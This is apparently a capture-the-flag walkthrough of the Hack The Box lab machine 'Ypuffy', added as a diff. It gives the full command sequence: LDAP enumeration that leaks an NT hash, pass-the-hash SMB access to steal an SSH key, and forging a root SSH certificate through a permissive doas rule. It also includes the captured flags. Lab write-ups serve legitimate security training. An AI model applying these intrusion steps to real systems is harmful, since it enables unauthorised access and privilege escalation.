@@ -1,0 +1,143 @@
+Ypuffy - 10.0.10.107
+
+//basic nmap scan of all ports 
+
+
+22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
+|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
+|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
+80/tcp  open  http        OpenBSD httpd
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
+389/tcp open  ldap        (Anonymous bind OK)
+445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
+
+// We got port 389 LDAP so we can do a ldap search via anonymous bind.
+
+locate nmap | grep ldap
+
+nmap -p 389 --script=ldap-search -oN ldap-search.scan 10.10.10.107
+
+\\here we got dc and Samba NTPassword uid,cn
+\\ dc=hackthebox,dc=htb
+\\ SambaNTPassword = 0B186E661BBDBDCF6047784DE8B9FD8B
+\\ cn=alice1978
+
+\\Having thr sambaNTPassword is basically the same thing as having a cleartext password.
+\\NT Password Hash - This is windows NT hash of the user;s password, encoded as 32 hex digits.
+
+\\Before we can mount a share, aside from guessing blindly at things like C$, we need to
+list out what shares are available. smbclient makes this very simple.
+
+smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L 10.10.10.107
+
+\\i got the share alice ready and waiting let's connect
+
+smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash \\\\10.10.10.107\\alice
+
+\\we got the smb session
+\\let's see the files, and great found ssh key let's download it.
+
+get my_private_key.ppk
+
+\\now i converted the putty key to use it directly in shell with putty tools
+\\ and this is how i did 
+
+puttygen my_private_key.ppk -O private-openssh -o alice1978-id_rsa
+puttygen my_private_key.ppk -O public-openssh -o alice1978-id_rsa.pub
+
+\\now i have the open ssh key's so i can get a shell on target
+
+ssh -l alice1978 -i alice1978-id_rsa 10.10.10.107
+
+*//// i got the user flag here """acbc06eb2982b14c2756b6c6e3767aab""" ////*
+
+
+///time for privesc
+
+now i remeber that port 80 was opened but what services it ran we didn't knew so let's look at web server configuration
+
+cat /etc/httpd.conf                                                                                                                                                                                         
+server "ypuffy.hackthebox.htb" {
+        listen on * port 80
+
+        location "/userca*" {
+                root "/userca"
+                root strip 1
+                directory auto index
+        }
+
+        location "/sshauth*" {
+                fastcgi socket "/run/wsgi/sshauthd.socket"
+        }
+
+        location * {
+                block drop
+        }
+}
+
+
+then i checked for appsrv from /etc/rc.conf.local
+
+in the home directory i found the bob8791 i founf the sql file in the structure
+
+it turns out that the application that is running on port 80 is most likely associated
+with ssh authentication, and it's time to look at the ssh server configuration file:
+
+\\it can be seen that authorization is performed using a certification authority, and the
+application on port 80 and sql dump from the bob8791 directory is responsible for access
+control (principals) . Check it for user alice1978:
+
+curl "http://127.0.0.1/sshauth?type=principals&username=alice1978"
+alice1978
+
+let's check for root
+
+curl "http://127.0.0.1/sshauth?type=principals&username=root"                 
+3m3rgencyB4ckd00r
+//but alice1978 does not have the right to access the user userca directory.in openBSD there is analog SUDO it is called DOAS, let check it;s config
+
+ypuffy$ cat /etc/doas.conf
+permit keepenv :wheel
+permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
+
+
+ypuffy$ ssh-keygen -t rsa -f /tmp/cert 
+Generating public/private rsa key pair.
+/tmp/cert already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/cert.
+Your public key has been saved in /tmp/cert.pub.
+The key fingerprint is:
+SHA256:9r3NsMUAR71VhLlEhO0ZKQ3REh/9VrU9pTsx6NlfyPo alice1978@ypuffy.hackthebox.htb
+The key's randomart image is:
++---[RSA 2048]----+
+|            =%+*B|
+|           .+o@oB|
+|          . o==O+|
+|           + +==+|
+|        S   + *..|
+|       . . . + o.|
+|          . + o .|
+|             O   |
+|            o E  |
++----[SHA256]-----+
+
+
+now connect with it
+
+//before i have to sign it forgot
+
+doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I root -n 3m3rgencyB4ckd00r /tmp/cert.pub
+Signed user key /tmp/cert-cert.pub: id "root" serial 0 for 3m3rgencyB4ckd00r valid forever
+
+ssh -i id_rsa -l root 127.0.0.1
+
+cat /root/root.txt
+1265f8e0a1984edd9dc1b6c3fcd1757f
+
+?? Machine Completed
+
